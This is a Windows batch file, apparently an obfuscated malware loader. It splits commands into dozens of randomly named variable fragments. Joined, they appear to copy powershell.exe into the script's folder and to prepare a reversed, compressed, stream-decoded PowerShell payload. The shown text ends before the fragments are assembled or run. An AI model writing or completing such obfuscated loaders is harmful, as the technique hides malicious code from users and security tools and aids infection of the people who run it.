@echo off
set "VjEqijafEB=nd"
set "krZTiGuyMD=0\"
set "SpBWisofQv=he"
set "xugkqmCUTd=ll"
set "wPqGrBApNI=ws"
set "KKmqAhEBzN=Sy"
set "OHjlPqYQPS=po"
set "MgNylpKGtG=in"
set "PXPeaeOmcn=we"
set "EXLUQgChoA=do"
set "SiwztCBsAl=.e"
set "aEIRwKScCF=y "
set "QJwHPPeVAx= /"
set "CfROJthiWV=ll"
set "kVrpwYTvyq=ow"
set "PuSLfDmoba=he"
set "MHbTQBihYv= C"
set "riSIXzClGl=:\"
set "cjvsJMQyVI=Wi"
set "MbGXADmJje=s\"
set "UyvcVnNozW=\v"
set "QwVAZAvSWH=xe"
set "MmmwXWQggJ=rS"
set "XrVAQAJbOo=32"
set "AaKwSQExpA=Po"
set "jlfQKDzCUo=rs"
set "QdHiKwGbUK=we"
set "yxHfagRfVL=st"
set "RcYuctdqLN=co"
set "SvaFWUCHQF=em"
set "axqFLwkWcg=1."
set "gLdvPonniC=py"
set "trVKRotBWt=\W"
set "VhwUFryPrF= %~dp0"
set "tHvqdUMUnY=cd"
set "YbhVKoGKhW=Stre"
set "fyPghAJVmG=Conv"
set "RlzhyfdBOR=:('g"
set "ORHucigTAe=Obje"
set "TYuBTxrGqr=ress"
set "vAjRIHfceg=o.Pa"
set "FscWZYdssQ=null"
set "oHajeFHxlK=Ko.I"
set "zChYDBQBJt=ddin"
set "ElbJXvcUyj=y.Pa"
set "NezcfwpczB=XmpC"
set "OpKZjLxiNA=se()"
set "anlpjJmkEu=morF"
set "oTdOtPFNfz= New"
set "kXVkQWkavx= = $"
set "XJhcTVIDAb=eam("
set "KXJpAwjCHh=ne);"
set "RMlBjtwCBu=daeR"
set "ibXdABzZrO=-1.."
set "CJDzYWTynW=ose("
set "oUeyNVWMEB=le  "
set "bfmDawqFup=ewLi"
